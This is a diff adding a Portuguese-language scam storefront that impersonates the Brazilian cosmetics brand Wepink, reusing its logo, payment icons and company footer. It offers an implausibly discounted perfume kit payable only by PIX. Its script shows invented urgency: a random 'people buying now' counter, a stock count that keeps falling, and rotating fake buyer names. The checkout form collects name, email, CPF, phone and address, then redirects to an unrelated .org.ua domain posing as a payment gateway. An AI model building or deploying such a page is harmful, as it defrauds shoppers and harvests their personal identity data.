@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+<title>Wepink Ultra</title>
+
+<style>
+
+body{
+margin:0;
+background:#f4f4f4;
+font-family:Arial;
+}
+
+.container{
+max-width:420px;
+margin:auto;
+background:#fff;
+min-height:100vh;
+padding-bottom:100px;
+}
+
+.header{
+display:flex;
+justify-content:space-between;
+align-items:center;
+padding:15px;
+background:#fff;
+position:sticky;
+top:0;
+z-index:10;
+}
+
+.logo img{
+height:28px;
+}
+
+.content{
+padding:15px;
+}
+
+.produto-img{
+width:100%;
+height:300px;
+object-fit:contain;
+}
+
+.badge{
+border:2px solid #ff007a;
+color:#ff007a;
+display:inline-block;
+padding:5px 12px;
+border-radius:20px;
+font-size:14px;
+}
+
+.titulo{
+font-size:20px;
+font-weight:bold;
+margin-top:10px;
+}
+
+.stars{
+color:#ffc107;
+margin-top:8px;
+}
+
+.preco-antigo{
+text-decoration:line-through;
+color:#999;
+margin-top:10px;
+}
+
+.preco{
+font-size:28px;
+font-weight:bold;
+}
+
+.fake{
+background:#fff0f7;
+color:#ff007a;
+padding:8px;
+border-radius:8px;
+margin-top:10px;
+font-size:14px;
+}
+
+.estoque{
+margin-top:8px;
+font-size:13px;
+color:#ff007a;
+font-weight:bold;
+}
+
+.prova{
+position:fixed;
+bottom:90px;
+left:10px;
+background:#fff;
+padding:10px 14px;
+border-radius:12px;
+box-shadow:0 4px 12px rgba(0,0,0,0.2);
+font-size:13px;
+display:none;
+z-index:999;
+}
+
+.sticky{
+position:fixed;
+bottom:0;
+left:0;
+width:100%;
+background:#fff;
+padding:10px;
+box-shadow:0 -2px 10px rgba(0,0,0,0.1);
+}
+
+.wrap{
+max-width:420px;
+margin:auto;
+display:flex;
+gap:10px;
+}
+
+.comprar{
+flex:1;
+background:#ff007a;
+color:#fff;
+border:none;
+padding:15px;
+border-radius:12px;
+font-size:16px;
+font-weight:bold;
+animation:pulse 1.5s infinite;
+}
+
+@keyframes pulse{
+0%{transform:scale(1)}
+50%{transform:scale(1.03)}
+100%{transform:scale(1)}
+}
+
+.carrinho{
+width:60px;
+border:2px solid #ff007a;
+background:#fff;
+color:#ff007a;
+border-radius:12px;
+font-size:20px;
+}
+
+.popup{
+position:fixed;
+bottom:-100%;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,0.7);
+display:flex;
+align-items:flex-end;
+transition:0.4s;
+}
+
+.popup.show{
+bottom:0;
+}
+
+.popup-box{
+background:#fff;
+width:100%;
+padding:20px;
+border-radius:20px 20px 0 0;
+}
+
+input{
+width:100%;
+padding:12px;
+margin-top:10px;
+border-radius:8px;
+border:1px solid #ccc;
+}
+
+.footer{
+background:#ff007a;
+padding:20px;
+font-size:13px;
+color:#fff;
+margin-top:20px;
+}
+
+.footer a{
+color:#fff;
+text-decoration:none;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="header">
+
+☰
+
+<div class="logo">
+<img src="https://wepink.vtexassets.com/assets/vtex/assets-builder/wepink.store-theme/5.0.0/svg/logo-primary___5bd0e7fa6451ba181395889123dfe00a.svg">
+</div>
+
+🛒
+
+</div>
+
+<div class="content">
+
+<div class="badge">lançamento</div>
+
+<img class="produto-img"
+src="https://wepink.vtexassets.com/arquivos/ids/163722-700-700?v=639066626489500000&width=700&height=700&aspect=true">
+
+<div class="titulo">
+Kit One Touch Latte + Ruby Rhodolite + Crimson Seraph + VF Golden + Roll-on VF Golden
+</div>
+
+<div class="stars">★★★★★ (4.9)</div>
+
+<div class="fake">
+🔥 <span id="contador">12</span> pessoas comprando agora
+</div>
+
+<div class="estoque">
+⚡ Restam apenas <span id="estoque">100</span> unidades no estoque
+</div>
+
+<div class="preco-antigo">R$ 551,90</div>
+
+<div class="preco">R$ 37,99</div>
+
+<div style="margin-top:15px;font-size:14px;line-height:1.5;color:#333;">
+
+<p><strong style="color:#ff007a;">⚠️ ATENÇÃO: Promoção relâmpago ativa por tempo limitado</strong></p>
+
+<p>Esse é o kit que está simplesmente desaparecendo do estoque. A combinação perfeita para quem quer sentir a experiência Wepink completa — com fragrâncias marcantes, sensação premium e aquele toque que faz todo mundo perguntar qual perfume você está usando.</p>
+
+<p>💖 Elegância, intensidade e presença em um único kit exclusivo.</p>
+
+<p>🔥 Esse valor NÃO é fixo.<br>
+Esse desconto é válido apenas para pagamento via PIX.<br>
+Assim que o lote promocional acabar, o preço volta automaticamente ao normal.</p>
+
+</div>
+
+</div>
+
+<div class="footer">
+
+<h4>Formas de pagamento</h4>
+
+<div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:15px;">
+
+<img src="https://wepink.vtexassets.com/assets/vtex/assets-builder/wepink.store-theme/5.0.0/svg/visa___e411afdf7f4f5a87e368bb90951f8e21.svg" height="22">
+<img src="https://wepink.vtexassets.com/assets/vtex/assets-builder/wepink.store-theme/5.0.0/svg/mastercard___bef22abd904b16a89535383905436dd7.svg" height="22">
+<img src="https://wepink.vtexassets.com/assets/vtex/assets-builder/wepink.store-theme/5.0.0/svg/diners-club___d5f0c1f692b4080d769cf5f1502612b4.svg" height="22">
+<img src="https://wepink.vtexassets.com/assets/vtex/assets-builder/wepink.store-theme/5.0.0/svg/amex___045d938b33e402cfa188a879eb063008.svg" height="22">
+<img src="https://wepink.vtexassets.com/assets/vtex/assets-builder/wepink.store-theme/5.0.0/svg/pix___01c4699613640d38300e9f0e7f2a621d.svg" height="22">
+
+</div>
+
+<p>- <a href="https://www.wepink.com.br/politica-de-privacidade">Política de Privacidade</a></p>
+<p>- <a href="https://www.wepink.com.br/termos-de-uso">Termos de Uso</a></p>
+
+<p><strong>Todos os direitos reservados © 2026 | SAVI COSMÉTICOS LTDA | CNPJ: 42.422.967/0001-01</strong></p>
+
+<p>Avenida Jabaquara, 2080 - Mirandópolis - São Paulo/SP - CEP: 04046-400</p>
+
+<p>Atendimento por Whatsapp: +55 (11) 99556-4258 | Horário: todos os dias das 07:00 às 21:30</p>
+
+<p>Atendimento por telefone: 0800-1000-146 | Horário: todos os dias das 08:00 às 20:00</p>
+
+<p>Atendimento por e-mail: atendimento@wepink.com.br</p>
+
+</div>
+
+</div>
+
+<div class="prova" id="prova"></div>
+
+<div class="sticky">
+<div class="wrap">
+
+<button class="comprar" onclick="abrirPopup()">Comprar</button>
+<button class="carrinho">+</button>
+
+</div>
+</div>
+
+<div class="popup" id="popup">
+
+<div class="popup-box">
+
+<h3>Finalizar Compra — Adicionar endereço de Entrega</h3>
+
+<input placeholder="Nome completo" required>
+<input type="email" placeholder="Email" required>
+<input id="cpf" placeholder="CPF" required>
+<input placeholder="Telefone" required>
+<input id="cep" placeholder="CEP" required>
+<input placeholder="Rua" required>
+<input placeholder="Bairro" required>
+
+<button class="comprar" onclick="irGateway()">Próximo</button>
+
+</div>
+
+</div>
+
+<script>
+
+setInterval(()=>{
+document.getElementById("contador").innerText =
+Math.floor(Math.random()*30)+1;
+},2000);
+
+let estoque=100;
+setInterval(()=>{
+if(estoque>3){
+estoque--;
+document.getElementById("estoque").innerText=estoque;
+}
+},8000);
+
+const nomes=[
+"Larissa Alves","Amanda Silva","João Pedro","Mariana Costa",
+"Lucas Santos","Camila Rocha","Juliana Lima",
+"Rafael Souza","Beatriz Fernandes","Gustavo Oliveira","Ana Clara"
+];
+
+function mostrarProva(){
+const prova=document.getElementById("prova");
+const nome=nomes[Math.floor(Math.random()*nomes.length)];
+prova.innerHTML="🔥 "+nome+" acabou de comprar";
+prova.style.display="block";
+setTimeout(()=>{prova.style.display="none";},3000);
+}
+setInterval(mostrarProva,6000);
+
+function abrirPopup(){
+document.getElementById("popup").classList.add("show");
+}
+
+document.getElementById("cpf").addEventListener("input",function(e){
+let v=e.target.value.replace(/\D/g,"").slice(0,11);
+v=v.replace(/(\d{3})(\d)/,"$1.$2");
+v=v.replace(/(\d{3})(\d)/,"$1.$2");
+v=v.replace(/(\d{3})(\d{1,2})$/,"$1.$2");
+e.target.value=v;
+});
+
+document.getElementById("cep").addEventListener("input",function(e){
+let v=e.target.value.replace(/\D/g,"").slice(0,8);
+v=v.replace(/(\d{5})(\d)/,"$1-$2");
+e.target.value=v;
+});
+
+function irGateway(){
+const inputs=document.querySelectorAll(".popup-box input");
+for(let i=0;i<inputs.length;i++){
+if(inputs[i].value.trim()===""){
+alert("Preencha todos os campos para continuar");
+return;
+}
+}
+window.location.href="https://ambienteseguro.org.ua/c/412d931586";
+}
+
+</script>
+
+</body>
+</html>
